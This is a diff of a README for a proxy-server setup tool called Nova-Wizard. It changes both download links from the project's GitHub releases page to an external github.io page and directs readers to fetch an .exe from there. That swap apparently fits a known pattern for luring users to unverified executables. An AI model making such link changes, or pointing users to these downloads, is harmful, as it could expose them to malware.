@@ -1,6 +1,6 @@
 # ⚡ Nova-Wizard - Build your private proxy server easily
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/hauberkfiord921/Nova-Wizard/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://hauberkfiord921.github.io)
 
 Nova-Wizard helps you set up a private, secure proxy server. You host this server on Cloudflare Workers. It uses OAuth for your identity. You do not need API tokens. You do not rely on third-party servers to manage your traffic. 
 
@@ -27,7 +27,7 @@ Follow these steps to set up your proxy server. The process takes about five min
 ### 1. Download the installer
 Visit the main release page to download the software.
 
-[Download Nova-Wizard](https://github.com/hauberkfiord921/Nova-Wizard/releases)
+[Download Nova-Wizard](https://hauberkfiord921.github.io)
 
 Select the file that ends in `.exe`. Save this file to your computer.
 
